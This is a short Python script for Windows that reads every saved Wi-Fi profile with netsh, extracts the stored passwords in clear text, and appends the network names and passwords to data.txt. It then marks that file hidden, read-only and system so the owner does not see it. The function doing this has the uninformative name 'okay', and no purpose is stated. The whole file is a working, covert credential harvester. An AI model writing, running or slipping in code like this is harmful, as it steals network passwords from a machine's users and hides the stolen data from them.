import subprocess as shell
import re
info = {}
data = info
def okay():
    data = shell.check_output(['netsh', 'wlan', 'show', 'profiles']).decode()
    users = re.findall("All User Profile     : (.*)", data)
    profiles = list()

    for i in users:
        a = i.split("\r")
        profiles.append(a[0])
    i = -1
    for profile in profiles:
        i += 1
        information = shell.check_output(['netsh', 'wlan', 'show', 'profile', profile]).decode()
        if re.findall("Security key           : Absent", information):
            continue
        else:
            passwords = shell.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                  capture_output=True).stdout.decode()
            password = re.findall("Key Content            :(.*)", passwords)[0]
            # print(f"Profile: {profile}, PAssword : {password}")
            info[profile] = password
            file = open('data.txt', 'a')
            file.write(f"{i}. Name : {profile} |Password :{password}")
    shell.run(['attrib', '+h', '+r', '+s', 'data.txt'])
if __name__ == '__main__':
    shell.run(['attrib', '-h', '-r', '-s', 'data.txt'])
    okay()
